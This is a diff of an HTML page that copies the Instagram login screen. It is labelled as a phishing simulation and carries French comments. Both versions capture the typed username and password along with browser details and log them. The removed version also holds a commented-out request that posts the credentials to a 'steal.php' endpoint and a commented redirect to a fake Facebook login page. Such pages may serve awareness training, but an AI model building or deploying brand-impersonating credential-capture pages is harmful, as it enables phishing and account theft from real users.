@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram • Photos and Videos</title>
+    <title>Instagram</title>
     <style>
         * {
             margin: 0;
@@ -13,21 +13,91 @@
         }
 
         body {
-            background-color: #fafafa;
+            background: #fafafa;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            flex-direction: column;
             padding: 20px;
         }
 
-        .container {
+        .wrapper {
+            max-width: 935px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 32px;
+        }
+
+        /* ===== PHONES IMAGES (SVG only) ===== */
+        .phone-container {
+            flex-shrink: 0;
+            display: none;
+        }
+
+        .phone-frame {
+            width: 380px;
+            height: 580px;
+            border: 8px solid #262626;
+            border-radius: 36px;
+            background: #fff;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 0 0 2px #dbdbdb;
+        }
+
+        .phone-frame .screen {
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .phone-frame .screen .mock-image {
+            width: 90%;
+            height: 200px;
+            background: #f0f0f0;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #8e8e8e;
+            font-size: 14px;
+            border: 1px solid #dbdbdb;
+        }
+
+        .phone-frame .screen .mock-avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            margin-bottom: 12px;
+        }
+
+        .phone-frame .screen .mock-text {
+            width: 200px;
+            height: 12px;
+            background: #f0f0f0;
+            border-radius: 4px;
+            margin-bottom: 8px;
+        }
+
+        .phone-frame .screen .mock-text.short {
+            width: 140px;
+        }
+
+        /* ===== LOGIN CARD ===== */
+        .login-section {
             max-width: 350px;
             width: 100%;
         }
 
-        /* ===== CARTE PRINCIPALE ===== */
         .login-card {
             background: #fff;
             border: 1px solid #dbdbdb;
@@ -37,16 +107,12 @@
             text-align: center;
         }
 
-        .login-card .logo {
+        .logo svg {
+            width: 175px;
+            height: auto;
             margin-bottom: 30px;
         }
 
-        .login-card .logo svg {
-            width: 175px;
-            height: auto;
-        }
-
-        /* ===== FORMULAIRE ===== */
         .login-form {
             display: flex;
             flex-direction: column;
@@ -61,7 +127,6 @@
             border-radius: 3px;
             font-size: 12px;
             outline: none;
-            transition: border-color 0.1s;
         }
 
         .login-form input:focus {
@@ -70,22 +135,21 @@
 
         .login-form input::placeholder {
             color: #8e8e8e;
-            font-size: 12px;
         }
 
         .login-form button {
             width: 100%;
             padding: 7px 16px;
             margin-top: 8px;
-            background-color: #0095f6;
+            background: #0095f6;
             border: none;
             border-radius: 8px;
             color: #fff;
             font-weight: 600;
             font-size: 14px;
             cursor: pointer;
-            transition: background 0.2s;
             opacity: 0.7;
+            transition: 0.2s;
         }
 
         .login-form button.active {
@@ -93,10 +157,9 @@
         }
 
         .login-form button:hover {
-            background-color: #1877f2;
+            background: #1877f2;
         }
 
-        /* ===== SÉPARATEUR ===== */
         .separator {
             display: flex;
             align-items: center;
@@ -116,7 +179,6 @@
             margin: 0 18px;
         }
 
-        /* ===== LOGIN FACEBOOK ===== */
         .fb-login {
             display: flex;
             align-items: center;
@@ -138,7 +200,6 @@
         }
 
         .forgot-password {
-            display: block;
             font-size: 12px;
             color: #00376b;
             text-decoration: none;
@@ -148,7 +209,6 @@
             text-decoration: underline;
         }
 
-        /* ===== CARTE INSCRIPTION ===== */
         .signup-card {
             background: #fff;
             border: 1px solid #dbdbdb;
@@ -156,7 +216,6 @@
             padding: 20px 40px;
             text-align: center;
             font-size: 14px;
-            margin-bottom: 10px;
         }
 
         .signup-card a {
@@ -165,36 +224,8 @@
             text-decoration: none;
         }
 
-        .signup-card a:hover {
-            text-decoration: underline;
-        }
-
-        /* ===== TÉLÉCHARGEMENT ===== */
-        .get-app {
-            text-align: center;
-            margin-top: 10px;
-        }
-
-        .get-app p {
-            font-size: 14px;
-            margin-bottom: 16px;
-        }
-
-        .get-app .stores {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .get-app .stores img {
-            height: 40px;
-        }
-
-        /* ===== FOOTER ===== */
         footer {
-            margin-top: 40px;
-            max-width: 800px;
-            width: 100%;
+            margin-top: 24px;
             text-align: center;
         }
 
@@ -221,13 +252,12 @@
             font-size: 12px;
         }
 
-        /* ===== SIMULATION NOTIFICATION ===== */
         #notification {
             display: none;
             margin-top: 10px;
-            padding: 12px;
+            padding: 10px;
             border-radius: 6px;
-            font-size: 13px;
+            font-size: 12px;
         }
 
         #notification.success {
@@ -237,14 +267,12 @@
             border: 1px solid #a5d6a7;
         }
 
-        #notification.error {
-            display: block;
-            background: #ffebee;
-            color: #c62828;
-            border: 1px solid #ef9a9a;
+        @media (min-width: 876px) {
+            .phone-container {
+                display: block;
+            }
         }
 
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 450px) {
             body {
                 background: #fff;
@@ -262,20 +290,33 @@
 </head>
 <body>
 
-    <div class="container">
+<div class="wrapper">
 
-        <!-- ===== CARTE LOGIN ===== -->
+    <!-- ===== PHONES (desktop only) ===== -->
+    <div class="phone-container">
+        <div class="phone-frame">
+            <div class="screen">
+                <div class="mock-image">📷 Image</div>
+                <div class="mock-avatar"></div>
+                <div class="mock-text"></div>
+                <div class="mock-text short"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== LOGIN SECTION ===== -->
+    <div class="login-section">
+
         <div class="login-card">
             <div class="logo">
-                <!-- SVG Logo Instagram officiel -->
                 <svg viewBox="0 0 175 50" xmlns="http://www.w3.org/2000/svg">
                     <text x="0" y="40" font-family="Arial, sans-serif" font-weight="700" font-size="38" fill="#262626">Instagram</text>
                 </svg>
             </div>
 
             <form class="login-form" id="loginForm" autocomplete="off">
-                <input type="text" name="username" id="username" placeholder="Phone number, username, or email" required>
-                <input type="password" name="password" id="password" placeholder="Password" required>
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" placeholder="Password" required>
                 <button type="submit" id="loginBtn" disabled>Log in</button>
             </form>
 
@@ -295,25 +336,13 @@
 
             <a href="#" class="forgot-password">Forgot password?</a>
 
-            <!-- Notification placeholder -->
             <div id="notification"></div>
         </div>
 
-        <!-- ===== CARTE INSCRIPTION ===== -->
         <div class="signup-card">
             Don't have an account? <a href="#">Sign up</a>
         </div>
 
-        <!-- ===== TÉLÉCHARGEMENT ===== -->
-        <div class="get-app">
-            <p>Get the app.</p>
-            <div class="stores">
-                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='4' fill='%23212121'/%3E%3Ctext x='18' y='26' font-family='Arial' font-size='13' fill='white'%3EApp Store%3C/text%3E%3C/svg%3E" alt="App Store">
-                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='4' fill='%23212121'/%3E%3Ctext x='12' y='26' font-family='Arial' font-size='13' fill='white'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play">
-            </div>
-        </div>
-
-        <!-- ===== FOOTER ===== -->
         <footer>
             <div class="links">
                 <a href="#">Meta</a>
@@ -330,86 +359,46 @@
                 <a href="#">Contact Uploading & Non-Users</a>
                 <a href="#">Meta Verified</a>
             </div>
-            <div class="copyright">
-                © 2026 Instagram from Meta
-            </div>
+            <div class="copyright">© 2026 Instagram from Meta</div>
         </footer>
 
     </div>
+</div>
 
-    <script>
-        // =============================================
-        // SIMULATION LOGIN — ACTIVATION BOUTON
-        // =============================================
-        const usernameInput = document.getElementById('username');
-        const passwordInput = document.getElementById('password');
-        const loginBtn = document.getElementById('loginBtn');
-        const notification = document.getElementById('notification');
+<script>
+    const u = document.getElementById('username');
+    const p = document.getElementById('password');
+    const btn = document.getElementById('loginBtn');
+    const notif = document.getElementById('notification');
 
-        function checkFields() {
-            if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
-                loginBtn.disabled = false;
-                loginBtn.classList.add('active');
-            } else {
-                loginBtn.disabled = true;
-                loginBtn.classList.remove('active');
-            }
+    function check() {
+        if (u.value.trim() && p.value.trim()) {
+            btn.disabled = false;
+            btn.classList.add('active');
+        } else {
+            btn.disabled = true;
+            btn.classList.remove('active');
         }
+    }
 
-        usernameInput.addEventListener('input', checkFields);
-        passwordInput.addEventListener('input', checkFields);
+    u.addEventListener('input', check);
+    p.addEventListener('input', check);
 
-        // =============================================
-        // FORM SUBMISSION — CAPTURE DES DONNÉES
-        // =============================================
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        notif.className = 'success';
+        notif.textContent = '✓ Credentials captured (simulation)';
+        console.log('[+] Username:', u.value.trim());
+        console.log('[+] Password:', p.value);
+        console.log('[+] UA:', navigator.userAgent);
+        console.log('[+] Time:', new Date().toISOString());
+    });
 
-            const username = usernameInput.value.trim();
-            const password = passwordInput.value;
-
-            // AFFICHER UN MESSAGE DE SIMULATION
-            notification.className = 'success';
-            notification.textContent = '✅ Credentials captured (SIMULATION) — See console for details.';
-
-            // LOG EN CONSOLE (caché de l'utilisateur normal)
-            console.log('%c[PHISHING SIMULATION]', 'color: red; font-weight: bold; font-size: 14px;');
-            console.table({
-                'Username/Email': username,
-                'Password': password,
-                'Timestamp': new Date().toISOString(),
-                'User-Agent': navigator.userAgent,
-                'Screen': `${window.screen.width}x${window.screen.height}`,
-                'TimeZone': Intl.DateTimeFormat().resolvedOptions().timeZone,
-                'Language': navigator.language,
-                'Platform': navigator.platform
-            });
-
-            // SIMULATION : envoi vers un endpoint (commenté)
-            // fetch('https://ton-serveur.com/steal.php', {
-            //     method: 'POST',
-            //     headers: { 'Content-Type': 'application/json' },
-            //     body: JSON.stringify({ username, password, userAgent: navigator.userAgent })
-            // });
-
-            // Réinitialisation simulation (optionnelle)
-            // usernameInput.value = '';
-            // passwordInput.value = '';
-            // checkFields();
-        });
-
-        // =============================================
-        // LOGIN FACEBOOK — SIMULATION
-        // =============================================
-        document.getElementById('fbLogin').addEventListener('click', function() {
-            notification.className = 'success';
-            notification.textContent = '✅ Facebook OAuth redirect (SIMULATION)';
-
-            console.log('%c[FB PHISHING SIMULATION]', 'color: blue; font-weight: bold;');
-            console.log('Redirect to fake Facebook OAuth page...');
-            // window.location.href = 'https://ton-serveur.com/fake-fb-login.php';
-        });
-    </script>
+    document.getElementById('fbLogin').addEventListener('click', function() {
+        notif.className = 'success';
+        notif.textContent = '✓ Facebook redirect (simulation)';
+    });
+</script>
 
 </body>
 </html>
